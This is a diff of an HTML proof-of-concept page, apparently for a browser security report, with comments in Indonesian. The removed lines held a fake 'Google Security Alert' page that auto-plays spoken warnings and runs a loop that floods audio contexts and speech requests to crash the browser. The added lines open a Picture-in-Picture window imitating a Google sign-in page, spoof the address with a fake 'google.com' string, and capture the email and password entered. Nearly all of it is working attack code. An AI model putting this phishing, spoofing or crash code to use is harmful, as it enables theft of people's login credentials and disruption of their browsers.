@@ -3,207 +3,176 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Alert</title>
+<title>Google Security Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #fff; min-height: 100vh; overflow: hidden; }
-  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
+  body { background: #f4f4f4; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+  .panel { background: #fff; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
+  h2 { color: #4285f4; margin-bottom: 10px; }
+  p { color: #666; font-size: 14px; margin-bottom: 20px; }
+  button { padding: 15px 30px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
+  button:hover { background: #1557b0; }
+  #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
 </style>
 </head>
 <body>
+
+<div class="panel" id="main-card">
+  <h2>🔒 Google Security Verification</h2>
+  <p>Klik tombol di bawah untuk membuka PiP dengan URL spoofing (subdomain panjang).</p>
+  <button id="startBtn">Open Spoofed PiP</button>
+  <div id="status">[*] Ready...</div>
+</div>
+
 <script>
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI AUTOPLAY
-  // ============================================
-  var CONFIG = {
-    tts: {
-      text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
-      lang: 'en-US',
-      rate: 0.85,
-      pitch: 1.0,
-      volume: 1.0,
-      repeatInterval: 8000,
-      maxRepeats: 20
-    },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
-  };
+  var btn = document.getElementById('startBtn');
+  var statusEl = document.getElementById('status');
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
-
-  // ============================================
-  // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
-  function speakOnce() {
-    if (!('speechSynthesis' in window)) return;
-    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
-
-    try {
-      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
-      u.lang = CONFIG.tts.lang;
-      u.rate = CONFIG.tts.rate;
-      u.pitch = CONFIG.tts.pitch;
-      u.volume = CONFIG.tts.volume;
-
-      var voices = window.speechSynthesis.getVoices();
-      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
-      if (enVoice) u.voice = enVoice;
-
-      u.onstart = function () { console.log('[TTS] Speaking #' + state.ttsCount); };
-      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
-      u.onend = function () {
-        state.ttsCount++;
-        if (state.ttsCount < CONFIG.tts.maxRepeats) {
-          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
-        }
-      };
-
-      window.speechSynthesis.speak(u);
-    } catch (e) { console.log('[TTS] fail:', e.message); }
-  }
-
-  function startTTS() {
-    if (state.ttsStarted) return;
-    state.ttsStarted = true;
-    window.speechSynthesis.cancel();
-    speakOnce();
+  function log(msg) {
+    statusEl.textContent = msg;
+    console.log("[PiP URL Spoof] " + msg);
   }
 
   // ============================================
-  // AUDIO CONTEXT UNLOCK
+  // 1. TRIGGER (KLIK)
   // ============================================
-  function unlockAudioContext() {
-    try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      if (ctx.state === 'suspended') {
-        ctx.resume().then(function () { console.log('[AC] resumed'); }).catch(function(){});
-      }
-      var osc = ctx.createOscillator();
-      var gain = ctx.createGain();
-      gain.gain.value = 0.0001;
-      osc.frequency.value = 20000;
-      osc.connect(gain);
-      gain.connect(ctx.destination);
-      osc.start();
-      osc.stop(ctx.currentTime + 0.1);
-    } catch (e) {}
-  }
-
-  // ============================================
-  // SILENT AUDIO ELEMENT
-  // ============================================
-  function trySilentAudio() {
-    try {
-      var a = new Audio(CONFIG.silentWav);
-      a.volume = 0.0001;
-      a.loop = true;
-      var p = a.play();
-      if (p && p.catch) p.catch(function(){});
-    } catch (e) {}
-  }
-
-  // ============================================
-  // MAIN AUDIO (Web Audio API)
-  // ============================================
-  function playMainAudio() {
-    if (state.mainPlayed) return;
-    state.mainPlayed = true;
+  btn.addEventListener('click', async function() {
+    log("[*] Membuka PiP dengan URL spoofing...");
 
     try {
-      var ctx = new (window.AudioContext || window.webkitAudioContext)();
-      var sr = ctx.sampleRate;
-      var dur = 3.0;
-      var buf = ctx.createBuffer(1, sr * dur, sr);
-      var d = buf.getChannelData(0);
-
-      for (var i = 0; i < d.length; i++) {
-        var t = i / sr;
-        var freq = 880 + (Math.floor(t * 4) % 2) * 440;
-        var env = Math.max(0, 1 - t / dur);
-        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.3 * env;
+      if (!window.documentPictureInPicture) {
+        alert("Document Picture-in-Picture tidak didukung.");
+        return;
       }
 
-      var src = ctx.createBufferSource();
-      src.buffer = buf;
-      src.connect(ctx.destination);
-      src.start();
-      src.onended = startTTS;
-      setTimeout(startTTS, 3500);
+      // ============================================
+      // 2. BUKA PiP
+      // ============================================
+      const pipWindow = await documentPictureInPicture.requestWindow({
+        width: 500,
+        height: 400
+      });
+
+      log('PiP Window Opened.');
+
+      // ============================================
+      // 3. TULIS KONTEN PiP DENGAN URL SPOOFING
+      // ============================================
+      pipWindow.document.open();
+      pipWindow.document.write(`
+        <!DOCTYPE html>
+        <html>
+        <head>
+          <meta charset="UTF-8">
+          <title>Google Security Verification</title>
+          <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+              background: #fff;
+              display: flex;
+              flex-direction: column;
+              justify-content: center;
+              align-items: center;
+              min-height: 100vh;
+              padding: 20px;
+              text-align: center;
+            }
+            .g-logo {
+              font-size: 48px;
+              font-weight: bold;
+              color: #4285f4;
+              margin-bottom: 20px;
+            }
+            h3 { font-size: 24px; color: #333; margin-bottom: 10px; }
+            p { font-size: 14px; color: #666; margin-bottom: 20px; }
+            input {
+              width: 100%;
+              padding: 12px;
+              margin-bottom: 12px;
+              border: 1px solid #ddd;
+              border-radius: 6px;
+              font-size: 14px;
+            }
+            button {
+              width: 100%;
+              padding: 12px;
+              background: #1a73e8;
+              color: #fff;
+              border: none;
+              border-radius: 6px;
+              font-size: 14px;
+              font-weight: bold;
+              cursor: pointer;
+            }
+            .footer {
+              margin-top: 15px;
+              font-size: 11px;
+              color: #f00;
+            }
+          </style>
+        </head>
+        <body>
+          <div class="g-logo">G</div>
+          <h3>Google Security Verification</h3>
+          <p>Please enter your credentials to continue.</p>
+          <input type="email" id="pipEmail" placeholder="Email or phone" autofocus />
+          <input type="password" id="pipPassword" placeholder="Password" />
+          <button id="pipLogin">Next</button>
+          <div class="footer">This is a simulated phishing test. Do not enter real credentials.</div>
+
+          <script>
+            (function() {
+              // URL Spoofing dengan subdomain panjang
+              try {
+                var spoofedUrl = '?............................google.com';
+                history.replaceState(null, '', spoofedUrl);
+              } catch (e) {}
+
+              // Event listener untuk menangkap input
+              document.getElementById('pipLogin').addEventListener('click', function() {
+                var email = document.getElementById('pipEmail').value;
+                var password = document.getElementById('pipPassword').value;
+
+                if (!email || !password) {
+                  alert("Email dan password harus diisi!");
+                  return;
+                }
+
+                // Tampilkan data yang ditangkap
+                document.body.innerHTML = \`
+                  <div style="font-family:monospace;padding:20px;background:#000;color:#0f0;border-radius:6px;width:100%;">
+                    <h3 style="color:#f00;">Credentials Captured!</h3>
+                    <p><strong>Email:</strong> \${email}</p>
+                    <p><strong>Password:</strong> \${password}</p>
+                    <p style="color:#666;margin-top:15px;">Redirecting to Google...</p>
+                  </div>
+                \`;
+
+                // Redirect ke Google asli setelah 2 detik
+                setTimeout(function() {
+                  window.location.href = 'https://www.google.com';
+                }, 2000);
+              });
+            })();
+          <\/script>
+        </body>
+        </html>
+      `);
+      pipWindow.document.close();
+
+      log('PiP URL Spoofing active.');
+
     } catch (e) {
-      startTTS();
+      log('Error: ' + e.message);
     }
-  }
+  }, { once: true });
 
-  // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
-  // ============================================
-  function triggerHighSeverityCrash() {
-    console.log("[!] Initiating High Severity Exploit Chain...");
-    
-    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
-    setInterval(function() {
-      try {
-        for (var i = 0; i < 2000; i++) {
-          var ctx = new (window.AudioContext || window.webkitAudioContext)();
-          var osc = ctx.createOscillator();
-          var gain = ctx.createGain();
-          
-          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
-          osc.connect(gain);
-          gain.connect(ctx.destination);
-          osc.start(0);
-          
-          // 2. Flooding Speech Utterance Queue
-          var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
-          window.speechSynthesis.speak(u);
-        }
-      } catch(e) {}
-    }, 50); // Eksekusi super cepat setiap 50 milidetik
-  }
-
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
-  unlockAudioContext();
-  trySilentAudio();
-
-  setTimeout(function () {
-    unlockAudioContext();
-    startTTS(); // coba TTS lebih awal
-  }, 100);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-  }, 500);
-
-  setTimeout(function () {
-    if (!state.mainPlayed) playMainAudio();
-    if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL CRASH TRIGGER DI SINI
-    triggerHighSeverityCrash();
-    
-  }, 1500);
-
-  // Retry jika audio diblokir
-  var retryCount = 0;
-  var retry = setInterval(function () {
-    retryCount++;
-    unlockAudioContext();
-    trySilentAudio();
-    if (!state.ttsStarted) startTTS();
-    if (retryCount > 10) clearInterval(retry);
-  }, 2000);
-
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
-    }
-  });
 })();
 </script>
+
 </body>
 </html>
